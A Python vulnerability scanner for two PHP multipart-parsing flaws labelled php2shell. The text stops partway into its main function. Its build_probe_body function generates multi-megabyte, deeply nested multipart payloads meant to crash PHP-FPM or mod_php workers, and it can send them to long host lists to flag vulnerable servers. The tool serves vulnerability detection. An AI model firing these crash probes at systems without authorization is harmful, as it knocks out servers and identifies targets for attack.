#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "h11>=0.14.0",
#     "tqdm>=4.64.0",
# ]
# ///
"""php2shell scanner for CVE-2026-109618 and CVE-2026-109619."""

import argparse
import asyncio
import json
import re
import ssl
import sys
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from functools import lru_cache
from typing import Dict, List, Optional, Tuple
from urllib.parse import SplitResult, quote, urljoin, urlsplit, urlunsplit

try:
    import h11
except ImportError:
    print("Error: 'h11' library required. Install with: pip install h11")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: 'tqdm' library required. Install with: pip install tqdm")
    sys.exit(1)


CVES = "CVE-2026-109618 / CVE-2026-109619"
DEFAULT_PATH = "/index.php"
PHPMYADMIN_PATH = "/show_config_errors.php"
PHPMYADMIN_MARKER = b"phpMyAdmin"
CONTROL_BOUNDARY = "x"
PROBE_BOUNDARY = ""
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
NESTED_KEYS = 62
BODY_READ_LIMIT = 1 << 20
EXCERPT_LIMIT = 2048
CONNECT_TIMEOUT = 10
MAX_RESPONSE_HEADER_BYTES = 10 << 20
UPLOAD_CHUNK_SIZE = 64 << 10
READ_BUFFER_HIGH_WATER = 256 << 10
READ_BUFFER_LOW_WATER = 64 << 10
WRITE_BUFFER_HIGH_WATER = 256 << 10
WRITE_BUFFER_LOW_WATER = 64 << 10
DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 "
    "Safari/537.36 PHP2Shell/1.0.0"
)

PROBES = ((1, 4000), (8, 1020), (20, 1020))
REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
HEADER_NAME_PATTERN = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")
SENSITIVE_HEADERS = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-api-key",
}
SENSITIVE_HEADER_PATTERN = re.compile(
    r"(?:^|[-_])(?:auth|authorization|bearer|cookie|key|passwd|password|"
    r"secret|session|token)(?:$|[-_])"
    r"|apikey|accesskey",
    re.IGNORECASE,
)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


@dataclass
class HTTPResult:
    status_code: Optional[int] = None
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    bytes_sent: int = 0
    error: Optional[str] = None

    @property
    def powered_by(self) -> str:
        for name, value in self.headers.items():
            if name.lower() == "x-powered-by":
                return value
        return ""


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def print_banner() -> None:
    print(f"\n{Colors.CYAN}{Colors.BOLD}brought to you by assetnote{Colors.RESET}\n")


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def parse_headers(header_list: Optional[List[str]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    for header in header_list or []:
        if ":" not in header:
            raise ValueError(f"invalid header {header!r}; expected 'Key: Value'")
        key, value = header.split(":", 1)
        key = key.strip()
        if not key:
            raise ValueError(f"invalid header {header!r}; header name is empty")
        value = value.lstrip()
        if not HEADER_NAME_PATTERN.fullmatch(key):
            raise ValueError(f"invalid header name {key!r}")
        if "\r" in value or "\n" in value:
            raise ValueError(f"invalid value for header {key!r}")
        try:
            key.encode("ascii")
            value.encode("latin-1")
        except UnicodeEncodeError as exc:
            raise ValueError(f"header {key!r} cannot be encoded as HTTP/1.1") from exc
        headers[key] = value
    return headers


def has_header(headers: Dict[str, str], name: str) -> bool:
    return any(key.lower() == name.lower() for key in headers)


def set_header(headers: Dict[str, str], name: str, value: str) -> None:
    for key in list(headers):
        if key.lower() == name.lower():
            del headers[key]
    headers[name] = value


def normalize_url(raw_url: str) -> str:
    raw_url = raw_url.strip()
    if not raw_url:
        raise ValueError("invalid or empty URL")
    if "://" not in raw_url:
        raw_url = "https://" + raw_url

    parsed = urlsplit(raw_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError("invalid HTTP URL")
    if parsed.username is not None or parsed.password is not None:
        raise ValueError(
            "credentials in URLs are not supported; use an Authorization header"
        )

    path = parsed.path
    if not path or path == "/":
        path = DEFAULT_PATH
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def safe_url_label(raw_url: str) -> str:
    value = raw_url.strip()
    if not value:
        return "<empty URL>"
    candidate = value if "://" in value else "https://" + value
    try:
        parsed = urlsplit(candidate)
    except ValueError:
        return "<invalid URL>"
    if not parsed.netloc:
        return "<invalid URL>"
    netloc = parsed.netloc.rsplit("@", 1)[-1]
    return urlunsplit((parsed.scheme, netloc, parsed.path, "", ""))


def replace_path(target_url: str, path_value: str) -> str:
    parsed = urlsplit(target_url)
    custom = urlsplit(path_value if path_value.startswith("/") else "/" + path_value)
    path = custom.path or DEFAULT_PATH
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def phpmyadmin_target(target_url: str) -> str:
    parsed = urlsplit(target_url)
    return urlunsplit((parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", ""))


@lru_cache(maxsize=len(PROBES))
def build_probe_body(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(
            f"php2shell probe of {size} bytes cannot hold {parts} parts "
            f"({len(base)} bytes)"
        )
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def request_headers(custom_headers: Dict[str, str], boundary: str) -> Dict[str, str]:
    headers = dict(custom_headers)
    for name in ("Content-Length", "Transfer-Encoding"):
        for key in list(headers):
            if key.lower() == name.lower():
                del headers[key]
    if not has_header(headers, "User-Agent"):
        headers["User-Agent"] = DEFAULT_USER_AGENT
    set_header(headers, "Content-Type", f"multipart/form-data; boundary={boundary}")
    set_header(headers, "Connection", "close")
    if not has_header(headers, "Accept-Encoding"):
        headers["Accept-Encoding"] = "gzip"
    return headers


class HTTPTransportError(Exception):
    """Raised for a well-formed HTTP exchange that cannot be completed."""


@dataclass
class ConnectionEnd:
    error: Optional[Exception]


class DuplexHTTPProtocol(asyncio.Protocol):
    def __init__(self) -> None:
        self.transport: Optional[asyncio.Transport] = None
        self.incoming = asyncio.Queue()
        self.writable = asyncio.Event()
        self.writable.set()
        self.buffered_bytes = 0
        self.reading_paused = False
        self.ended = False
        self.end_error: Optional[Exception] = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]
        transport.set_write_buffer_limits(  # type: ignore[attr-defined]
            high=WRITE_BUFFER_HIGH_WATER,
            low=WRITE_BUFFER_LOW_WATER,
        )

    def data_received(self, data: bytes) -> None:
        if not data:
            return
        self.buffered_bytes += len(data)
        self.incoming.put_nowait(data)
        if (
            self.buffered_bytes >= READ_BUFFER_HIGH_WATER
            and not self.reading_paused
            and self.transport is not None
        ):
            self.transport.pause_reading()  # type: ignore[attr-defined]
            self.reading_paused = True

    def eof_received(self) -> Optional[bool]:
        self.finish(None)
        return False

    def connection_lost(self, exc: Optional[Exception]) -> None:
        self.finish(exc)

    def pause_writing(self) -> None:
        self.writable.clear()

    def resume_writing(self) -> None:
        self.writable.set()

    def finish(self, error: Optional[Exception]) -> None:
        if self.ended:
            return
        self.ended = True
        self.end_error = error
        self.writable.set()
        self.incoming.put_nowait(ConnectionEnd(error))

    async def write(self, data: bytes) -> None:
        await self.writable.wait()
        if self.ended or self.transport is None:
            raise self.end_error or BrokenPipeError("connection closed while uploading")
        self.transport.write(data)  # type: ignore[attr-defined]
        await asyncio.sleep(0)

    async def read(self) -> bytes:
        item = await self.incoming.get()
        if isinstance(item, ConnectionEnd):
            if item.error is not None:
                raise item.error
            return b""

        self.buffered_bytes -= len(item)
        if (
            self.reading_paused
            and self.buffered_bytes <= READ_BUFFER_LOW_WATER
            and self.transport is not None
            and not self.ended
        ):
            self.transport.resume_reading()  # type: ignore[attr-defined]
            self.reading_paused = False
        return item

    def abort(self) -> None:
        if self.transport is not None:
            self.transport.abort()


def header_value(headers: Dict[str, str], name: str) -> str:
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return ""


def remove_header(headers: Dict[str, str], name: str) -> None:
    for key in list(headers):
        if key.lower() == name.lower():
            del headers[key]


def request_target(parsed: SplitResult) -> bytes:
    path = quote(
        parsed.path or "/",
        safe="/%:@!$&'()*+,;=-._~",
        encoding="utf-8",
        errors="strict",
    )
    if parsed.query:
        path += "?" + quote(
            parsed.query,
            safe="/?%:@!$&'()*+,;=-._~",
            encoding="utf-8",
            errors="strict",
        )
    return path.encode("ascii")


def host_header(parsed: SplitResult) -> str:
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError("target URL does not contain a hostname")
    hostname = hostname.encode("idna").decode("ascii")
    if ":" in hostname:
        hostname = f"[{hostname}]"
    if parsed.port is not None:
        hostname += f":{parsed.port}"
    return hostname


def wire_headers(
    parsed: SplitResult, headers: Dict[str, str], body_size: int
) -> List[Tuple[bytes, bytes]]:
    supplied_host = header_value(headers, "Host")
    host = supplied_host or host_header(parsed)
    encoded: List[Tuple[bytes, bytes]] = [(b"Host", host.encode("latin-1"))]
    for name, value in headers.items():
        if name.lower() == "host":
            continue
        encoded.append((name.encode("ascii"), value.encode("latin-1")))
    encoded.append((b"Content-Length", str(body_size).encode("ascii")))
    return encoded


def response_headers(raw_headers: List[Tuple[bytes, bytes]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    original_names: Dict[str, str] = {}
    for raw_name, raw_value in raw_headers:
        name = raw_name.decode("ascii")
        value = raw_value.decode("latin-1")
        lowered = name.lower()
        if lowered in original_names:
            original = original_names[lowered]
            headers[original] += ", " + value
        else:
            original_names[lowered] = name
            headers[name] = value
    return headers


async def upload_body(
    connection: h11.Connection,
    protocol: DuplexHTTPProtocol,
    body: bytes,
) -> None:
    for offset in range(0, len(body), UPLOAD_CHUNK_SIZE):
        data = connection.send(h11.Data(data=body[offset : offset + UPLOAD_CHUNK_SIZE]))
        if data:
            await protocol.write(data)
    data = connection.send(h11.EndOfMessage())
    if data:
        await protocol.write(data)


async def decode_gzip_data(decoder, data: bytes, body: bytearray):
    pending = data
    if decoder.eof and pending:
        decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)

    while pending:
        try:
            decoded = decoder.decompress(pending, UPLOAD_CHUNK_SIZE)
        except zlib.error as exc:
            raise HTTPTransportError(f"invalid gzip response: {exc}") from exc

        remaining = BODY_READ_LIMIT - len(body)
        if remaining > 0:
            body.extend(decoded[:remaining])

        if decoder.eof:
            pending = decoder.unused_data
            if pending:
                decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
        else:
            pending = decoder.unconsumed_tail

        if pending:
            await asyncio.sleep(0)
    return decoder


async def read_response(
    connection: h11.Connection, protocol: DuplexHTTPProtocol
) -> HTTPResult:
    status_code: Optional[int] = None
    reason = ""
    headers: Dict[str, str] = {}
    body = bytearray()
    decoder = None

    while True:
        event = connection.next_event()
        if event is h11.NEED_DATA:
            data = await protocol.read()
            connection.receive_data(data)
            continue
        if event is h11.PAUSED:
            raise HTTPTransportError("unexpected additional HTTP response")
        if isinstance(event, h11.InformationalResponse):
            if event.status_code == 101:
                raise HTTPTransportError("HTTP protocol upgrades are not supported")
            continue
        if isinstance(event, h11.Response):
            status_code = event.status_code
            reason = event.reason.decode("latin-1")
            headers = response_headers(list(event.headers))
            content_encoding = header_value(headers, "Content-Encoding").strip().lower()
            if content_encoding == "gzip":
                decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
                remove_header(headers, "Content-Encoding")
                remove_header(headers, "Content-Length")
            elif content_encoding not in ("", "identity"):
                raise HTTPTransportError(
                    f"unsupported content encoding: {content_encoding}"
                )
            continue
        if isinstance(event, h11.Data):
            if status_code is None:
                raise HTTPTransportError(
                    "received response body before response headers"
                )
            remaining = BODY_READ_LIMIT - len(body)
            if decoder is not None:
                decoder = await decode_gzip_data(decoder, event.data, body)
            elif remaining > 0:
                body.extend(event.data[:remaining])
            continue
        if isinstance(event, h11.EndOfMessage):
            if status_code is None:
                raise HTTPTransportError("response ended before response headers")
            if decoder is not None:
                try:
                    tail = decoder.flush()
                except zlib.error as exc:
                    raise HTTPTransportError(f"invalid gzip response: {exc}") from exc
                remaining = BODY_READ_LIMIT - len(body)
                body.extend(tail[:remaining])
                if not decoder.eof:
                    raise HTTPTransportError("truncated gzip response")
            return HTTPResult(status_code, reason, headers, bytes(body))
        if isinstance(event, h11.ConnectionClosed):
            raise HTTPTransportError("connection closed before the response completed")


async def exchange_post(
    target_url: str,
    body: bytes,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> HTTPResult:
    parsed = urlsplit(target_url)
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError("target URL does not contain a hostname")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    ssl_context: Optional[ssl.SSLContext] = None
    open_kwargs = {}
    if parsed.scheme == "https":
        ssl_context = ssl.create_default_context()
        ssl_context.set_alpn_protocols(["http/1.1"])
        if not verify_ssl:
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        open_kwargs = {
            "ssl": ssl_context,
            "server_hostname": hostname,
            "ssl_handshake_timeout": min(CONNECT_TIMEOUT, timeout),
        }

    loop = asyncio.get_running_loop()
    transport, base_protocol = await asyncio.wait_for(
        loop.create_connection(
            DuplexHTTPProtocol,
            host=hostname,
            port=port,
            happy_eyeballs_delay=0.25,
            **open_kwargs,
        ),
        timeout=min(CONNECT_TIMEOUT, timeout),
    )
    protocol = base_protocol
    if not isinstance(protocol, DuplexHTTPProtocol):
        transport.abort()
        raise HTTPTransportError("failed to initialize HTTP transport")
    upload_task: Optional[asyncio.Task] = None
    try:
        connection = h11.Connection(
            h11.CLIENT, max_incomplete_event_size=MAX_RESPONSE_HEADER_BYTES
        )
        request = h11.Request(
            method=b"POST",
            target=request_target(parsed),
            headers=wire_headers(parsed, headers, len(body)),
        )
        data = connection.send(request)
        if data:
            await protocol.write(data)

        upload_task = asyncio.create_task(upload_body(connection, protocol, body))
        response = await read_response(connection, protocol)
        return response
    finally:
        if upload_task is not None:
            if not upload_task.done():
                upload_task.cancel()
            await asyncio.gather(upload_task, return_exceptions=True)
        protocol.abort()


async def timed_exchange_post(
    target_url: str,
    body: bytes,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> HTTPResult:
    return await asyncio.wait_for(
        exchange_post(target_url, body, headers, timeout, verify_ssl),
        timeout=timeout,
    )


def send_post(
    target_url: str,
    body: bytes,
    boundary: str,
    custom_headers: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
    follow_redirects: bool = False,
) -> HTTPResult:
    headers = request_headers(custom_headers, boundary)
    result = HTTPResult()
    current_url = target_url
    for redirects in range(11 if follow_redirects else 1):
        result.bytes_sent += len(body)
        try:
            response = asyncio.run(
                timed_exchange_post(current_url, body, headers, timeout, verify_ssl)
            )
        except ssl.SSLError as exc:
            result.error = f"SSL error: {exc}"
            break
        except asyncio.TimeoutError:
            result.error = "request timed out"
            break
        except h11.RemoteProtocolError as exc:
            result.error = f"response read failed: {exc}"
            break
        except (h11.LocalProtocolError, ValueError, UnicodeError) as exc:
            result.error = f"request failed: {exc}"
            break
        except HTTPTransportError as exc:
            result.error = f"response read failed: {exc}"
            break
        except OSError as exc:
            result.error = f"connection error: {exc}"
            break

        result.status_code = response.status_code
        result.reason = response.reason
        result.headers = response.headers
        result.body = response.body
        location = header_value(response.headers, "Location").strip()
        if (
            not follow_redirects
            or response.status_code not in (301, 302, 303, 307, 308)
            or not location
        ):
            break
        if redirects == 10:
            result.error = "too many redirects (limit 10)"
            break

        next_url = urljoin(current_url, location)
        old, new = urlsplit(current_url), urlsplit(next_url)
        if new.scheme not in ("http", "https") or not new.hostname:
            result.error = f"redirect to unsupported URL: {location}"
            break
        if (old.scheme.lower(), old.netloc.lower()) != (
            new.scheme.lower(),
            new.netloc.lower(),
        ):
            for name in list(headers):
                if is_sensitive_header(name) or name.lower() == "host":
                    del headers[name]
        current_url = next_url
    return result


def version_verdict(powered_by: str) -> Optional[str]:
    match = VERSION_PATTERN.search(powered_by)
    if not match:
        return None
    major, minor, patch = (int(value) for value in match.groups())
    fixed_patch = FIXED_VERSIONS.get((major, minor))
    if fixed_patch is None:
        return None
    return "FIXED" if patch >= fixed_patch else "VULNERABLE"


def crash_signal(
    control: HTTPResult, probe: HTTPResult, sapi: str
) -> Tuple[Optional[str], Optional[str]]:
    if (
        b"Allowed memory size of " in probe.body
        and b" bytes exhausted" in probe.body
        and b"Unknown" in probe.body
    ):
        mode = (
            "PHP-FPM"
            if sapi == "fpm"
            else "mod_php"
            if sapi == "mod_php"
            else "mod_php/PHP-FPM"
        )
        return (
            mode,
            "in-band PHP fatal error (memory exhausted in Unknown) raised while "
            "parsing the multipart body",
        )

    if probe.status_code == 500 and control.body and not probe.body:
        mode = (
            "PHP-FPM"
            if sapi == "fpm"
            else "mod_php"
            if sapi == "mod_php"
            else "mod_php/PHP-FPM"
        )
        return (
            mode,
            "HTTP 500 with an empty body although the control request produced output",
        )

    if sapi == "mod_php":
        return None, None

    if probe.status_code in (502, 503, 504):
        return (
            "PHP-FPM",
            f"HTTP {probe.status_code} from the web server fronting PHP-FPM "
            "(worker died mid-request)",
        )
    if probe.status_code == 200 and control.body and not probe.body:
        return (
            "PHP-FPM",
            "HTTP 200 with an empty body although the control request produced "
            "output (worker died mid-request)",
        )
    return None, None


def describe_response(response: HTTPResult) -> str:
    if response.error:
        return (
            f"request failed after sending {response.bytes_sent} bytes: "
            f"{response.error}"
        )
    return (
        f"HTTP {response.status_code}, {len(response.body)} byte response "
        f"(sent {response.bytes_sent} bytes)"
    )


def response_dump(response: HTTPResult) -> Optional[str]:
    if response.status_code is None:
        return None
    lines = [f"HTTP/1.1 {response.status_code} {response.reason}".rstrip()]
    lines.extend(
        f"{name}: {redact_header(name, value)}"
        for name, value in response.headers.items()
    )
    excerpt = response.body[:EXCERPT_LIMIT].decode("utf-8", errors="replace")
    return "\r\n".join(lines) + "\r\n\r\n" + excerpt


def request_dump(
    target_url: str,
    headers: Dict[str, str],
    body_size: int,
    description: str,
) -> str:
    parsed: SplitResult = urlsplit(target_url)
    request_target = parsed.path or "/"
    if parsed.query:
        request_target += "?" + parsed.query
    lines = [f"POST {request_target} HTTP/1.1", f"Host: {parsed.netloc}"]
    lines.extend(
        f"{name}: {redact_header(name, value)}" for name, value in headers.items()
    )
    lines.append(f"Content-Length: {body_size}")
    return "\r\n".join(lines) + f"\r\n\r\n<{description}; {body_size} bytes>"


def is_sensitive_header(name: str) -> bool:
    lowered = name.lower()
    return lowered in SENSITIVE_HEADERS or bool(
        SENSITIVE_HEADER_PATTERN.search(lowered)
    )


def redact_header(name: str, value: str) -> str:
    return "<redacted>" if is_sensitive_header(name) else value


def terminal_safe(value: str) -> str:
    return "".join(
        character
        if character >= " " and character != "\x7f"
        else f"\\x{ord(character):02x}"
        for character in value
    )


def base_result(host: str) -> dict:
    return {
        "host": host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": None,
        "reason": None,
        "sapi": None,
        "powered_by": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "control": None,
        "probes": [],
        "timestamp": utc_now(),
    }


def apply_response(result: dict, response: HTTPResult) -> None:
    result["status_code"] = response.status_code
    result["response"] = response_dump(response)


def response_metadata(response: HTTPResult) -> dict:
    return {
        "status_code": response.status_code,
        "response_bytes": len(response.body),
        "bytes_sent": response.bytes_sent,
        "error": response.error,
        "description": describe_response(response),
    }


def check_url(
    host: str,
    target_url: str,
    timeout: int,
    verify_ssl: bool,
    custom_headers: Dict[str, str],
    sapi: str,
    follow_redirects: bool = False,
) -> dict:
    result = base_result(host)
    result["tested_url"] = target_url
    result["final_url"] = target_url

    control_headers = request_headers(custom_headers, CONTROL_BOUNDARY)
    control = send_post(
        target_url,
        CONTROL_BODY,
        CONTROL_BOUNDARY,
        custom_headers,
        timeout,
        verify_ssl,
        follow_redirects,
    )
    result["request"] = request_dump(
        target_url,
        control_headers,
        len(CONTROL_BODY),
        "minimal multipart control body",
    )
    apply_response(result, control)
    result["control"] = response_metadata(control)

    if control.error:
        result["error"] = f"control request failed: {control.error}"
        result["reason"] = result["error"]
        return result
    if control.status_code is not None and control.status_code >= 500:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = f"control request returned HTTP {control.status_code}"
        result["reason"] = result["error"]
        return result

    if PHPMYADMIN_MARKER in control.body:
        target_url = phpmyadmin_target(target_url)
        result["final_url"] = target_url
        control = send_post(
            target_url,
            CONTROL_BODY,
            CONTROL_BOUNDARY,
            custom_headers,
            timeout,
            verify_ssl,
            follow_redirects,
        )
        result["request"] = request_dump(
            target_url,
            control_headers,
            len(CONTROL_BODY),
            "minimal multipart control body",
        )
        apply_response(result, control)
        result["control"] = response_metadata(control)
        if control.error:
            result["error"] = f"phpMyAdmin control request failed: {control.error}"
            result["reason"] = result["error"]
            return result
        if control.status_code is not None and control.status_code >= 500:
            result["verdict"] = "INCONCLUSIVE"
            result["error"] = (
                f"phpMyAdmin control request returned HTTP {control.status_code}"
            )
            result["reason"] = result["error"]
            return result

    powered_by = control.powered_by
    rejected = False
    rejected_reason = None

    for index, (size_mib, parts) in enumerate(PROBES, start=1):
        body = build_probe_body(size_mib, parts)
        probe_headers = request_headers(custom_headers, PROBE_BOUNDARY)
        probe = send_post(
            target_url,
            body,
            PROBE_BOUNDARY,
            custom_headers,
            timeout,
            verify_ssl,
            follow_redirects,
        )
        probe_metadata = response_metadata(probe)
        probe_metadata.update({"probe": index, "size_mib": size_mib, "parts": parts})
        result["probes"].append(probe_metadata)
        result["request"] = request_dump(
            target_url,
            probe_headers,
            len(body),
            f"php2shell probe {index}: {size_mib} MiB, {parts} parts, "
            f"{NESTED_KEYS} nested keys",
        )
        apply_response(result, probe)

        if probe.powered_by:
            powered_by = probe.powered_by
        result["powered_by"] = powered_by or None

        if probe.error:
            result["verdict"] = "INCONCLUSIVE"
            result["error"] = (
                f"probe {index} failed before a response was read: {probe.error}"
            )
            result["reason"] = result["error"]
            return result

        if probe.status_code in REJECTED_STATUSES:
            rejected = True
            rejected_reason = (
                f"probe {index} was rejected with HTTP {probe.status_code} "
                "before PHP parsed it"
            )
            break

        detected_sapi, signal = crash_signal(control, probe, sapi)
        if signal:
            result["vulnerable"] = True
            result["verdict"] = "VULNERABLE"
            result["sapi"] = detected_sapi
            result["reason"] = (
                f"probe {index} ({size_mib} MiB, {parts} parts) crashed the "
                f"request handler: {signal}"
            )
            return result

        if version_verdict(powered_by) == "FIXED":
            result["vulnerable"] = False
            result["verdict"] = "FIXED"
            result["reason"] = (
                "no crash observed and X-Powered-By reports a patched release: "
                + powered_by
            )
            return result

    by_version = version_verdict(powered_by)
    result["powered_by"] = powered_by or None
    if by_version == "VULNERABLE":
        result["vulnerable"] = True
        result["verdict"] = "VULNERABLE"
        result["sapi"] = (
            "unknown" if sapi == "auto" else "PHP-FPM" if sapi == "fpm" else "mod_php"
        )
        result["reason"] = (
            "no crash observed; X-Powered-By reports an unpatched release: "
            + powered_by
        )
    elif by_version == "FIXED":
        result["vulnerable"] = False
        result["verdict"] = "FIXED"
        result["reason"] = (
            "no crash observed and X-Powered-By reports a patched release: "
            + powered_by
        )
    elif rejected:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = rejected_reason
        result["reason"] = rejected_reason
    else:
        result["vulnerable"] = False
        result["verdict"] = "NO SIGNAL"
        result["reason"] = "no crash observed and no PHP version advertised"
    return result


def check_vulnerability(
    host: str,
    timeout: int = 60,
    verify_ssl: bool = True,
    custom_headers: Optional[Dict[str, str]] = None,
    sapi: str = "auto",
    paths: Optional[List[str]] = None,
    follow_redirects: bool = False,
) -> dict:
    display_host = safe_url_label(host)
    try:
        normalized = normalize_url(host)
    except ValueError as exc:
        result = base_result(display_host)
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    targets = (
        [replace_path(normalized, path) for path in paths] if paths else [normalized]
    )
    fallback: Optional[dict] = None
    fallback_priority = {"NO SIGNAL": 0, "FIXED": 1, "INCONCLUSIVE": 2, "ERROR": 2}
    for target_url in targets:
        result = check_url(
            normalized,
            target_url,
            timeout,
            verify_ssl,
            custom_headers or {},
            sapi,
            follow_redirects,
        )
        if result["vulnerable"] is True:
            return result
        if fallback is None or fallback_priority.get(
            result["verdict"], 0
        ) > fallback_priority.get(fallback["verdict"], 0):
            fallback = result
    return fallback or base_result(normalized)


def load_lines(path: str, label: str) -> List[str]:
    values: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as handle:
            for line in handle:
                value = line.strip()
                if value and not value.startswith("#"):
                    values.append(value)
    except OSError as exc:
        print(colorize(f"[ERROR] Failed to read {label} file: {exc}", Colors.RED))
        sys.exit(1)
    return values


def deduplicate_hosts(hosts: List[str]) -> List[str]:
    deduplicated = []
    seen = set()
    for host in hosts:
        try:
            parsed = urlsplit(normalize_url(host))
            key = (
                parsed.scheme.lower(),
                parsed.netloc.lower(),
                parsed.path,
            )
        except ValueError:
            key = (safe_url_label(host),)
        if key not in seen:
            seen.add(key)
            deduplicated.append(host)
    return deduplicated


def save_results(
    results: List[dict],
    output_file: str,
    vulnerable_only: bool = True,
    announce: bool = True,
) -> bool:
    selected = (
        [result for result in results if result.get("vulnerable") is True]
        if vulnerable_only
        else results
    )
    output = {
        "scan_time": utc_now(),
        "total_results": len(selected),
        "results": selected,
    }
    try:
        with open(output_file, "w", encoding="utf-8") as handle:
            json.dump(output, handle, indent=2)
        if announce:
            print(colorize(f"\n[+] Results saved to: {output_file}", Colors.GREEN))
        return True
    except OSError as exc:
        print(colorize(f"\n[ERROR] Failed to save results: {exc}", Colors.RED))
        return False


def print_result(result: dict, verbose: bool = False) -> None:
    host = result["host"]
    verdict = result["verdict"]
    if result["vulnerable"] is True:
        status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
    elif result["vulnerable"] is False:
        status = colorize("[NOT VULNERABLE]", Colors.GREEN)
    elif verdict == "INCONCLUSIVE":
        status = colorize("[INCONCLUSIVE]", Colors.YELLOW)
    else:
        status = colorize("[ERROR]", Colors.YELLOW)

    details = []
    if result.get("status_code") is not None:
        details.append(f"Status: {result['status_code']}")
    if result.get("sapi"):
        details.append(f"SAPI: {result['sapi']}")
    if verdict:
        details.append(f"Verdict: {verdict}")
    suffix = " - " + " - ".join(details) if details else ""
    print(f"{status} {colorize(terminal_safe(host), Colors.WHITE)}{suffix}")

    if result.get("final_url") and result.get("final_url") != result.get("tested_url"):
        print(f"  -> Retargeted to: {terminal_safe(result['final_url'])}")
    if verbose and result.get("reason"):
        print(f"  -> {terminal_safe(result['reason'])}")
    if verbose and result.get("response"):
        print(colorize("  Response snippet:", Colors.CYAN))
        for line in result["response"].split("\r\n")[:10]:
            print(f"    {terminal_safe(line)}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="php2shell Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -l hosts.txt -t 20 -o results.json
  %(prog)s -u https://example.com -H "Authorization: Bearer token"
  %(prog)s -u https://example.com --path /phpinfo.php
  %(prog)s -l hosts.txt --sapi fpm --timeout 90
        """,
    )
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("-u", "--url", help="Single URL/host to check")
    input_group.add_argument(
        "-l", "--list", help="File containing hosts (one per line)"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=60,
        help="Request timeout in seconds (default: 60)",
    )
    parser.add_argument("-o", "--output", help="Output file for results (JSON)")
    parser.add_argument(
        "--all-results",
        action="store_true",
        help="Save all results, not only vulnerable hosts",
    )
    parser.add_argument(
        "-k",
        "--insecure",
        action="store_true",
        help="Disable TLS certificate verification",
    )
    parser.add_argument(
        "--follow-redirects",
        action="store_true",
        help="Follow HTTP redirects (up to 10 hops)",
    )
    parser.add_argument(
        "-H",
        "--header",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Custom header in 'Key: Value' format; repeatable",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Show verdict reasons and response snippets",
    )
    parser.add_argument(
        "-q", "--quiet", action="store_true", help="Only print vulnerable hosts"
    )
    parser.add_argument(
        "--no-color", action="store_true", help="Disable colored output"
    )
    parser.add_argument(
        "--sapi",
        choices=("auto", "mod_php", "fpm"),
        default="auto",
        help="Verdict rules to use (default: auto)",
    )
    parser.add_argument(
        "--path", action="append", dest="paths", help="Custom path to test; repeatable"
    )
    parser.add_argument(
        "--path-file", help="File containing paths to test (one per line)"
    )
    return parser


def main() -> None:
    args = build_parser().parse_args()
    if args.threads < 1:
        raise SystemExit("--threads must be at least 1")
    if args.timeout < 1:
        raise SystemExit("--timeout must be at least 1")

    if args.no_color or not sys.stdout.isatty():
